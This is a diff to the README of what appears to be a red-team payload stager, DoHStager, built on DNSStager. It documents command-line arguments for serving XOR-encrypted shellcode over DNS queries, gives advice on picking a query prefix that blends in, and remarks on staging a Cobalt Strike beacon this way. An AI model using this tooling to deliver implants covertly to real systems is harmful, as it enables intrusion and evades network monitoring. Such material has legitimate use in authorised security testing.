@@ -20,6 +20,14 @@ Run the `dnsstager`python script as follows:
 utput ~/payload.exe --prefix emperor --sleep 1 --xorkey 0x10 --shellcode_path ~/calc-thread64.bin
 ```
 
+The arguments:
+
+- `--domain p.pacc.tortellozzi.club` is the domain that you want to use for DNSStager
+- `--payload x64/c/ipv6`is the type of payload that you want to generate, do not change this.
+- `--prefix emperor` the prexif to prepend to all the queries, find a suitable name that will blend in.
+- `--xorkey 0x10`the key used to encrypt the shellcode/payload  
+- `--shellcode_path ~/calc-thread64.bin` is the shellcode that you want to serve 
+
 Take note of the `xorkey` parameter you use, as you will need to manually copy it in the `DoHStager.cpp` file later.
 
 You can modify line 18 of the `DoHStager.cpp` file to use other DoH providers, the provided PoC only used Google's DNS:
@@ -75,3 +83,8 @@ And the only thing that was changed in the original server's python script was t
 +        print_success("Server started on port 5050!")
          server.start()
 ```
+
+## Other Notes
+
+* This tool is not great in terms of performance. In fact, to download a fully stageless Cobalt Strike beacon might take approximately one hour wilst genertaing a lot of traffic. Use at your own risk.
+* 
